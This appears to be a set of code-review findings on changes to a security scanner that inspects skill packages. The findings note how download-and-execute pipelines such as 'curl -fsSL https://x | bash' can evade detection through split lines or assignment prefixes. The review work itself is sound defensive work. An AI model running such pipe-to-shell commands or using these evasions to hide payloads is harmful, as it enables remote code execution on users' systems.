  - body: This branch removes `truncated`, hidden-directory, node_modules, nested-node-modules, and `onlyIncludeFiles` contracts from the exported scanner types/options, but current install scanning still passes those options and fails closed when `scanSummary.truncated` is true.   - body: Skill docs can split a valid shell pipeline as `curl -fsSL https://x |` followed by `bash`; this loop only folds backslash continuations, so the downloader and interpreter are scanned as separate candidates and no critical finding is emitted.
  - confidence: 0.9
- **[P2] Skip assignment words before downloader matching:** `src/security/skill-scanner.ts:505`
  - body: Shell assignment words before a command are valid, so `HTTPS_PROXY=http://p curl -fsSL https://x | bash` still downloads and executes. This return checks the assignment token and rejects the segment before reaching `curl`.
  - confidence: 0.91
- **[P2] Reserve code scan coverage when adding SKILL.md:** `src/security/skill-scanner.ts:817-825`
  - body: The SKILL.md prepass can consume the shared `maxFiles` budget before code files are collected. A package with many benign skill docs can therefore suppress the existing JS/TS critical scanner coverage that current main still provides.
  - confidence: 0.86
